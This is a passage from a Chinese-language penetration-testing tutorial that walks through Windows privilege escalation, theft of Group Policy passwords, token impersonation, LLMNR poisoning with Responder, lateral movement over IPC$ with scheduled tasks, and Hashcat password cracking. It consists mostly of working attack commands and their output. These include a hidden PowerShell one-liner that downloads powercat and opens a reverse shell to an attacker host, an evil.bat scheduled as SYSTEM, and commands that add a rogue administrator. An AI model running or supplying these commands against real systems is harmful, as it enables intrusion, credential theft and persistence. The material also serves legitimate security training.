<pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix\Desktop&gt; powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Invoke-AllChecks&#125;&quot;[*] Running Invoke-AllChecks[*] Checking if user is in a local group with administrative privileges...[+] User is in a local group that grants administrative privileges![+] Run a BypassUAC attack to elevate privileges to admin.[*] Checking for unquoted service paths...[*] Checking service executable and argument permissions...ServiceName    : MongoDBPath           : C:\Web\mongodb\bin\mongod.exe --auth --config C:\Web\mongodb\mongod.conf --s                 erviceModifiableFile : C:\Web\mongodb\mongod.confStartName      : LocalSystemAbuseFunction  : Install-ServiceBinary -ServiceName &#39;MongoDB&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>由于结果可能比较长，因此也可以将其保存到 txt 文件里，方便查看</p>
<pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Invoke-AllChecks | Out-File -Encoding ASCII result.txt&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>从检查的结果可以看出 MongoDB 服务存在漏洞，利用 Install-ServiceBinary 模块，通过 PowerUp 利用该处权限配置不当添加管理员用户。</p>
<pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Install-ServiceBinary -ServiceName &#39;MongoDB&#39; -UserName test -Password Passw0rd&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix\Desktop&gt; powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Install-ServiceBinary -ServiceName &#39;MongoDB&#39; -UserName test -Password Passw0rd&#125;&quot;ServiceName                   ServicePath                   Command                       BackupPath-----------                   -----------                   -------                       ----------MongoDB                       C:\Web\mongodb\bin\mongod...  net user test Passw0rd &#x2F;ad... C:\Web\mongodb\bin\mongod...<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>重启系统，查看用户，发现 test 已经被添加到管理员组了。</p>
<pre class="line-numbers language-none"><code class="language-none">PS C:\Users\teamssix\Desktop&gt; net user test用户名                 test全名……本地组成员             *Administrators       *Users全局组成员             *None命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Metasploit-1"><a href="#Metasploit-1" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>在 MSF 中，先看下已上线主机的权限</p>
<pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; getuidServer username: TEAMSSIX\dev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>MSF 中对应服务权限配置不当的利用模块是 <code>exploit/windows/local/service_permissions</code></p>
<p>利用步骤如下：</p>
<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;service_permissions
set payload windows&#x2F;meterpreter&#x2F;reverse_tcp
set lhost 192.168.7.1
set lport 4444
set session 1
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210722172401.png"></p>
<p>可以看到会话直接被提升到了 SYSTEM 权限。</p>
<h1 id="0x16-组策略凭据获取"><a href="#0x16-组策略凭据获取" class="headerlink" title="0x16 组策略凭据获取"></a>0x16 组策略凭据获取</h1><h2 id="0、前言-1"><a href="#0、前言-1" class="headerlink" title="0、前言"></a>0、前言</h2><p>SYSVOL 是活动目录里的一个用于存储域公共文件服务器副本的共享文件夹，在域中的所有域控之间进行复制，SYSVOL 在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录域范围内共享，所有的域策略均存放在 C:\Windows\SYSVOL\DOMAIN\Policies\ 目录中。</p>
<p>管理员在域中新建一个组策略后，系统会自动在 SYSVOL 目录中生成一个 XML 文件。</p>
<p>该文件中保存了该组策略更新后的密码，该密码使用 AES-256 算法，但 2012 年微软公布了该密码的私钥，也就是说任何人都可以对其进行解密。</p>
<h2 id="1、查找包含-cpassword-的-XML-文件"><a href="#1、查找包含-cpassword-的-XML-文件" class="headerlink" title="1、查找包含 cpassword 的 XML 文件"></a>1、查找包含 cpassword 的 XML 文件</h2><p>浏览 SYSVOL 文件夹，手动查找包含 cpassword 的 XML 文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210728141704.png"></p>
<p>或者使用 findstr 自动搜索包含 cpassword 的 XML 文件</p>
<pre class="line-numbers language-none"><code class="language-none">findstr &#x2F;s &#x2F;i &quot;cpassword&quot; C:\Windows\SYSVOL\*.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210728142511.png"></p>
<h2 id="2、解密-cpassword-密文"><a href="#2、解密-cpassword-密文" class="headerlink" title="2、解密 cpassword 密文"></a>2、解密 cpassword 密文</h2><h3 id="python-脚本"><a href="#python-脚本" class="headerlink" title="python 脚本"></a>python 脚本</h3><p> Gpprefdecrypt.py 下载地址：<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/leonteale/pentestpackage/master/Gpprefdecrypt.py">https://raw.githubusercontent.com/leonteale/pentestpackage/master/Gpprefdecrypt.py</a></p>
<pre class="line-numbers language-none"><code class="language-none">python2.7 Gpprefdecrypt.py Wdkeu1drbxqPJm7YAtPtwBtyzcqO88hJUBDD2eseoY0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210728143302.png"></p>
<h3 id="PowerShell-脚本"><a href="#PowerShell-脚本" class="headerlink" title="PowerShell 脚本"></a>PowerShell 脚本</h3><p>PowerSploit 项目中提供了 Get-GPPPassword.ps1 脚本。</p>
<p>脚本下载地址：<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1</a></p>
<p>直接远程下载脚本执行：</p>
<pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -Exec Bypass -C &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Get-GPPPassword.ps1&#39;);Get-GPPPassword&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果无法下载可以使用 github 代理</p>
<pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -Exec Bypass -C &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Get-GPPPassword.ps1&#39;);Get-GPPPassword&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210728144214.png"></p>
<p>或者下载到本地，执行也行</p>
<pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-GPPPassword.ps1
Get-GPPPassword<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>如果 PowerShell 由于处在受限模式以至于无法导入脚本，可以使用以下命令绕过。</p>
<pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\Get-GPPPassword.ps1;Get-GPPPassword&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>使用 post/windows/gather/credentials/gpp 模块也可以</p>
<pre class="line-numbers language-none"><code class="language-none">use post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gpp
set session 1
run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210728145138.png"></p>
<h1 id="0x17-令牌窃取"><a href="#0x17-令牌窃取" class="headerlink" title="0x17 令牌窃取"></a>0x17 令牌窃取</h1><h2 id="0、前言-2"><a href="#0、前言-2" class="headerlink" title="0、前言"></a>0、前言</h2><p>令牌（Token）是指系统中的临时秘钥，相当于账户和密码，有了令牌就可以在不知道密码的情况下访问目标相关资源了，这些令牌将持续存在于系统中，除非系统重新启动。</p>
<h2 id="1、MSF"><a href="#1、MSF" class="headerlink" title="1、MSF"></a>1、MSF</h2><p>在获取到 Meterpreter Shell 后，使用以下命令获取令牌</p>
<pre class="line-numbers language-none"><code class="language-none">load incognitolist_tokens -u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210729095721.png"></p>
<p>这里有两种令牌，一个是 Delegation Tokens 即授权令牌，还有一种是 Impersonation Tokens 即模拟令牌。前者支持交互式登录比如远程桌面，后者支持非交互的会话。</p>
<p>令牌获取的数量取决于获取到 Shell 的权限等级。</p>
<p>如果已经获取到了 SYSTEM 权限的令牌，那么攻击者就可以伪造这个令牌，拥有对应的权限。</p>
<pre class="line-numbers language-none"><code class="language-none">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210729100415.png"></p>
<p>可以看到我们已经通过伪造 SYSTEM 的令牌拿到 SYSTEM 权限了。</p>
<p>不过值得注意的是，如果不加双引号，\ 需要改成 <code>\\</code> 才行，个人猜测可能是因为 \ 被当做转义字符处理的原因。</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210729100653.png"></p>
<h2 id="2、Rotten-Potato-本地提权"><a href="#2、Rotten-Potato-本地提权" class="headerlink" title="2、Rotten Potato 本地提权"></a>2、Rotten Potato 本地提权</h2><p>Rotten Potato 直译过来就烂土豆的意思，如果目标中存在有效的令牌，就可以通过 Rotten Potato 模拟用户令牌实现提权。</p>
<p>Rotten Potato 项目地址：<a target="_blank" rel="noopener" href="https://github.com/breenmachine/RottenPotatoNG">https://github.com/breenmachine/RottenPotatoNG</a></p>
<p>运行 RottenPotato.exe 直接弹出 SYSTEM 权限的 CMD 窗口，不需要用到 MSF。</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210729101949.png"></p>
<h1 id="0x18-LLMNR-和-NetBIOS-欺骗攻击"><a href="#0x18-LLMNR-和-NetBIOS-欺骗攻击" class="headerlink" title="0x18 LLMNR 和 NetBIOS 欺骗攻击"></a>0x18 LLMNR 和 NetBIOS 欺骗攻击</h1><h2 id="0、前言-3"><a href="#0、前言-3" class="headerlink" title="0、前言"></a>0、前言</h2><p>如果已经进入目标网络，但是没有获得凭证，可以使用 LLMNR 和 NetBIOS 欺骗攻击对目标进行无凭证条件下的权限获取。</p>
<h2 id="1、基本概念"><a href="#1、基本概念" class="headerlink" title="1、基本概念"></a>1、基本概念</h2><h3 id="LLMNR"><a href="#LLMNR" class="headerlink" title="LLMNR"></a>LLMNR</h3><p>本地链路多播名称解析（LLMNR）是一种域名系统数据包格式，当局域网中的 DNS 服务器不可用时，DNS 客户端就会使用 LLMNR 解析本地网段中机器的名称，直到 DNS 服务器恢复正常为止。</p>
<p>从 Windows Vista 开始支持 LLMNR ，Linux 系统也通过 systemd 实现了此协议，同时 LLMNR 也支持 IPv6。</p>
<h3 id="NetBIOS"><a href="#NetBIOS" class="headerlink" title="NetBIOS"></a>NetBIOS</h3><p>NetBIOS 协议是由 IBM 公司开发，主要用于数十台计算机的小型局域网，根据 NetBIOS 协议广播获得计算机名称，并将其解析成相应的 IP 地址。</p>
<p>从 Windows NT 以后版本的所有操作系统中都可以使用 NetBIOS，不过 NetBIOS 不支持 IPv6.</p>
<p>NetBIOS 提供的三种服务：</p>
<pre><code>i、NetBIOS-NS（名称服务）：主要用于名称注册和解析，以启动会话和分发数据报，该服务默认监听 UDP 137 端口，也可以使用 TCP 的 137 端口进行监听。

ii、Datagram Distribution Service（数据报分发服务）：无连接服务，该服务负责进行错误检测和恢复，默认监听 UDP 138 端口。

iii、Session Service（会话服务）：允许两台计算机建立连接，默认使用 TCP 139 端口。
</code></pre>
<h3 id="Net-NTLM-Hash"><a href="#Net-NTLM-Hash" class="headerlink" title="Net-NTLM Hash"></a>Net-NTLM Hash</h3><blockquote>
<p>NTLM 即 NT LAN Manager，NTLM 是指 telnet 的一种验证身份方式，即问询/应答协议，是 Windows NT 早期版本的标准安全协议。</p>
</blockquote>
<p>Net-NTLM Hash 不同于 NTLM Hash，NTLM Hash 是 Windows 登录密码的 Hash 值，可以在 Windows 系统的 SAM 文件或者域控的 NTDS.dit 文件中提取到出来，NTLM Hash 支持哈希传递攻击。 </p>
<p>Net-NTLM Hash 是网络环境下 NTLM 认证的 Hash，使用 Responder 抓取的通常就是 Net-NTLM Hash，该 Hash 不能进行哈希传递，但可用于 NTLM 中继攻击或者使用 Hashcat 等工具碰撞出明文进行横向。</p>
<h2 id="2、利用"><a href="#2、利用" class="headerlink" title="2、利用"></a>2、利用</h2><p>Responder 是一款使用 Python 编写用于毒化 LLMNR 和 NBT-NS 请求的一款工具。</p>
<p>假设我们已连接到 Windows Active Directory 环境，当网络上的设备尝试用 LLMNR 和 NBT-NS（NetBIOS 名称服务）请求来解析目标机器时，Responder 就会伪装成目标机器。</p>
<p>当受害者机器尝试登陆攻击者机器，Responder 就可以获取受害者机器用户的 Net-NTLM 哈希值。</p>
<p>Responder 项目地址：<a target="_blank" rel="noopener" href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></p>
<p>Responder 不支持 Windows，这里使用 Kali 进行演示。</p>
<p>Responder 开启监听，-I 指定网卡，这里 eth1 的 IP 为 192.168.7.65</p>
<pre class="line-numbers language-none"><code class="language-none">python Responder.py -I eth1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>开启监听后，当目标主机上有人访问 Responder 主机的共享目录时，就会看到对方的 Net-NTLM 哈希值了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210729190444.png"></p>
<p>再利用 Hashcat 进行碰撞</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -m 5600 hash.txt password.txt -D 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210729190835.png"></p>
<h1 id="0x19-IPC-与计划任务"><a href="#0x19-IPC-与计划任务" class="headerlink" title="0x19 IPC 与计划任务"></a>0x19 IPC 与计划任务</h1><h2 id="0、前言-4"><a href="#0、前言-4" class="headerlink" title="0、前言"></a>0、前言</h2><p>在多层代理的环境中，由于网络限制，通常采用命令行的方式连接主机，这里学习下 IPC 建立会话与配置计划任务的相关点。</p>
<h2 id="1、IPC"><a href="#1、IPC" class="headerlink" title="1、IPC"></a>1、IPC</h2><p>IPC (Internet Process Connection) 是为了实现进程间通信而开放的命名管道，当目标开启了 IPC$ 文件共享并得到用户账号密码后，就可以使用 IPC 建立连接，获取权限。</p>
<p>建立 IPC 连接：</p>
<pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.107\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>输入 net use 可以查看当前建立的连接</p>
<pre class="line-numbers language-none"><code class="language-none">C:\&gt;net use \\192.168.7.107\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administrator命令成功完成。C:\&gt;net use会记录新的网络连接。状态       本地        远程                      网络-------------------------------------------------------------------------------OK                     \\192.168.7.107\ipc$      Microsoft Windows Network命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>映射磁盘到本地</p>
<pre class="line-numbers language-none"><code class="language-none">net use t: \\192.168.7.107\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果想删除映射的磁盘</p>
<pre class="line-numbers language-none"><code class="language-none">net use t: &#x2F;del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>dir 列出对方目录</p>
<pre class="line-numbers language-none"><code class="language-none">dir \\192.168.7.107\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">C:\&gt;dir \\192.168.7.107\c$ 驱动器 \\192.168.7.107\c$ 中的卷没有标签。 卷的序列号是 BC2F-8F01 \\192.168.7.107\c$ 的目录2020&#x2F;11&#x2F;24  17:28    &lt;DIR&gt;          Program Files2020&#x2F;11&#x2F;24  17:26    &lt;DIR&gt;          Program Files (x86)2021&#x2F;02&#x2F;13  17:49    &lt;DIR&gt;          TEMP2021&#x2F;08&#x2F;02  11:42    &lt;DIR&gt;          Users2020&#x2F;11&#x2F;25  08:37    &lt;DIR&gt;          Windows               0 个文件              0 字节              5 个目录 32,833,009,664 可用字节<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>tasklist 查看进程</p>
<pre class="line-numbers language-none"><code class="language-none">tasklist &#x2F;S 192.168.7.107 &#x2F;U administrator &#x2F;P 1qaz@WSX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">C:\&gt;tasklist &#x2F;S 192.168.7.107 &#x2F;U administrator &#x2F;P 1qaz@WSX映像名称                       PID 会话名              会话#       内存使用&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;System Idle Process              0                            0         24 KSystem                           4                            0        368 Ksmss.exe                       260                            0        628 Kcsrss.exe                      356                            0      2,360 Kwininit.exe                    408                            0        264 Kcsrss.exe                      420                            1      8,692 Kwinlogon.exe                   468                            1      2,012 Kservices.exe                   512                            0      7,460 Klsass.exe                      520                            0     10,216 Klsm.exe                        528                            0      4,148 Kspoolsv.exe                   1356                            0      6,504 Ksvchost.exe                   1392                            0      7,028 K<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用 \del 可断开连接</p>
<pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.107\ipc$ &#x2F;del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="2、计划任务"><a href="#2、计划任务" class="headerlink" title="2、计划任务"></a>2、计划任务</h2><p>Windows 可用于创建计划任务的命令有两个，分别是 at 和 schtasks，at 在 Windows Server 2008 及之后的系统中，已经被废弃了。</p>
<p>这里看看在建立 IPC 连接后，使用计划任务运行可执行文件，主要步骤如下：</p>
<p>1、查看目标主机时间</p>
<p>2、上传可执行文件到目标主机</p>
<p>3、设置计划任务执行可执行文件</p>
<p>4、删除计划任务</p>
<p>首先查看下目标主机时间</p>
<pre class="line-numbers language-none"><code class="language-none">net time \\192.168.7.107<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">C:\&gt;net time \\192.168.7.107\\192.168.7.107 的当前时间是 2021&#x2F;8&#x2F;2 14:28:01命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>创建一个反弹木马 bat 程序，这里使用 PowerShell 进行反弹，bat 文件内容如下：</p>
<pre class="line-numbers language-none"><code class="language-none">powershell.exe -nop -w hidden -exec bypass -c &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;);powercat -c 192.168.7.4 -p 4444 -e cmd&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在攻击机上开启 nc 监听</p>
<pre class="line-numbers language-none"><code class="language-none">nc -lvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>将 bat 程序上传到目标主机</p>
<pre class="line-numbers language-none"><code class="language-none">copy evil.bat \\192.168.7.107\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用 at 创建计划任务</p>
<pre class="line-numbers language-none"><code class="language-none">at \\192.168.7.107 14:30 C:\evil.bat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果想清除 ID 为 1 的计划任务</p>
<pre class="line-numbers language-none"><code class="language-none">at \\192.168.7.107 1 &#x2F;del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使用 schtasks 创建计划任务</p>
<pre class="line-numbers language-none"><code class="language-none"># 开机以 system 权限执行 C:\evil.bat
schtasks &#x2F;create &#x2F;s 192.168.7.107 &#x2F;tn evil &#x2F;sc onstart &#x2F;tr C:\evil.bat &#x2F;ru system &#x2F;f

# 在 2021&#x2F;08&#x2F;03 前的每一天的 14:30:00 执行 C:\evil.bat
schtasks &#x2F;create &#x2F;s 192.168.7.107 &#x2F;tn evil &#x2F;tr C:\evil.bat &#x2F;sc daily &#x2F;st 14:30:00 &#x2F;ed 2021&#x2F;08&#x2F;03

# 立刻运行名称为 evil 的任务
schtasks &#x2F;run &#x2F;s 192.168.7.107 &#x2F;i &#x2F;tn &quot;evil&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果想清除名称为 evil 的计划任务</p>
<pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;delete &#x2F;s 192.168.7.107 &#x2F;tn &quot;evil&quot; &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在建立 IPC 连接后，除了使用计划任务进行间接的反弹 Shell，还可以通过 PsExec 直接反弹 Shell</p>
<p>PsExec 下载地址：<a target="_blank" rel="noopener" href="https://download.sysinternals.com/files/PSTools.zip">https://download.sysinternals.com/files/PSTools.zip</a></p>
<pre class="line-numbers language-none"><code class="language-none">Psexec.exe -accepteula \\192.168.7.107 -s cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210802180916.png"></p>
<h1 id="0x20-Hashcat-的使用"><a href="#0x20-Hashcat-的使用" class="headerlink" title="0x20 Hashcat 的使用"></a>0x20 Hashcat 的使用</h1><h2 id="1、介绍-6"><a href="#1、介绍-6" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>Hashcat 是一款用于破解密码的工具，据说是世界上最快最高级的密码破解工具，支持 LM 哈希、MD5、SHA 等系列的密码破解，同时也支持 Linux、Mac、Windows 平台。</p>
<p>工具地址：<a target="_blank" rel="noopener" href="https://hashcat.net/">https://hashcat.net</a></p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/hashcat/hashcat">https://github.com/hashcat/hashcat</a></p>
<h2 id="2、安装-3"><a href="#2、安装-3" class="headerlink" title="2、安装"></a>2、安装</h2><h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><p>Mac 用户直接使用 brew 安装即可</p>
<pre class="line-numbers language-none"><code class="language-none">brew install hashcat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><p>对于 Debain 的 Linux，比如 Kali、Ubuntu 可以直接使用 apt 进行安装</p>
<pre class="line-numbers language-none"><code class="language-none">apt install hashcat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>或者下载官方二进制文件进行安装</p>
<p>在 <a target="_blank" rel="noopener" href="https://github.com/hashcat/hashcat/releases">https://github.com/hashcat/hashcat/releases</a> 里下载最新版压缩包，这里以 6.2.4 版为例</p>
<pre class="line-numbers language-none"><code class="language-none">tar zxvf hashcat-6.2.4.7zcd hashcat-6.2.4chmod +x hashcat.bin.&#x2F;hashcat.bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h3><p>在 <a target="_blank" rel="noopener" href="https://github.com/hashcat/hashcat/releases">https://github.com/hashcat/hashcat/releases</a> 里下载最新版压缩包，解压后可以看到 hashcat.exe</p>
<h2 id="3、使用-3"><a href="#3、使用-3" class="headerlink" title="3、使用"></a>3、使用</h2><p>常用参数：</p>
<pre class="line-numbers language-none"><code class="language-none">-r	使用自定义破解规则-o	指定破解成功后的 hash 及所对应的明文密码的存放位置-m	指定要破解的 hash 类型，如果不指定类型，则默认是 MD5-a	指定要使用的破解模式，其值参考后面对参数。“-a 0” 字典攻击，“-a 1” 组合攻击；“-a 3” 掩码攻击-D	指定 opencl 的设备类型--show		显示已经破解的 hash 及该 hash 所对应的明文--force		忽略破解过程中的警告信息,跑单条 hash 可能需要加上此选项--remove	删除已被破解成功的 hash--username		忽略 hash 文件中的指定的用户名,在破解 linux 系统用户密码 hash 可能会用到--increment		启用增量破解模式,你可以利用此模式让 hashcat 在指定的密码长度范围内执行破解过程--increment-min			密码最小长度,后面直接等于一个整数即可,配置 increment 模式一起使用--increment-max			密码最大长度,同上--outfile-format		指定破解结果的输出格式 id ,默认是 3--self-test-disable	    关闭启动自检<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>-a 破解模式：</p>
<pre class="line-numbers language-none"><code class="language-none">0 | Straight		（字段破解）1 | Combination	    （组合破解）3 | Brute-force	    （掩码暴力破解）6 | Hybrid Wordlist + Mask（字典+掩码破解）7 | Hybrid Mask + Wordlist（掩码+字典破解）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>-D 指定设备类型</p>
<pre class="line-numbers language-none"><code class="language-none">1 | CPU2 | GPU3 | FPGA, DSP, Co-Processor<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>一般使用 -D 2 指定 GPU 破解</p>
<p>掩码设置：</p>
<pre class="line-numbers language-none"><code class="language-none">l | abcdefghijklmnopqrstuvwxyz				纯小写字母u | ABCDEFGHIJKLMNOPQRSTUVWXYZ				纯大写字母d | 0123456789								纯数字h | 0123456789abcdef						十六进制小写字母和数字H | 0123456789ABCDEF		    			十六进制大写字母和数字s |  !&quot;#$%&amp;&#39;()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[\]^_&#96;&#123;|&#125;~	    特殊字符a | ?l?u?d?s								键盘上所有可见的字符b | 0x00 - 0xff								匹配密码空格<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>掩码设置举例：</p>
<pre class="line-numbers language-none"><code class="language-none">八位数字密码：?d?d?d?d?d?d?d?d八位未知密码：?a?a?a?a?a?a?a?a前四位为大写字母，后面四位为数字：?u?u?u?u?d?d?d?d前四位为数字或者是小写字母，后四位为大写字母或者数字：?h?h?h?h?H?H?H?H前三个字符未知，中间为admin，后三位未知：?a?a?aadmin?a?a?a6-8位数字密码：--increment --increment-min 6 --increment-max 8 ?d?d?d?d?d?d?d?d6-8位数字+小写字母密码：--increment --increment-min 6 --increment-max 8 ?h?h?h?h?h?h?h?h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>自定义掩码规则：</p>
<pre class="line-numbers language-none"><code class="language-none">--custom-charset1 [chars]等价于 -1--custom-charset2 [chars]等价于 -2--custom-charset3 [chars]等价于 -3--custom-charset4 [chars]等价于 -4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在掩码中用 ?1、?2、?3、?4 来表示</p>
<p>注意：</p>
<ul>
<li>–custom-charset1 abcd ?1?1?1?1?1 等价于 -1 abcd ?1?1?1?1?1</li>
<li>-3 abcdef -4 123456 ?3?3?3?3?4?4?4?4 表示前四位可能是 adbcdef，后四位可能是 123456</li>
</ul>
<p>另外 Hash 模式与 ID 的对照表由于太长，这里就不放了，可以直接 hashcat -h 进行查看</p>
<h2 id="4、示例"><a href="#4、示例" class="headerlink" title="4、示例"></a>4、示例</h2><h3 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h3><p>密码为 8 位数字</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 --force d54d1702ad0f8326224b817c796763c9 ?d?d?d?d?d?d?d?d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>密码为 4 位小写字母+数字</p>
<pre class="line-numbers language-none"><code class="language-none">hashcat -a 3 --force 4575621b0d88c303998e63fc74d165b0 -1 ?l?d ?1?1?1?1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>密码为 1-4 位大写字母+数字</p>
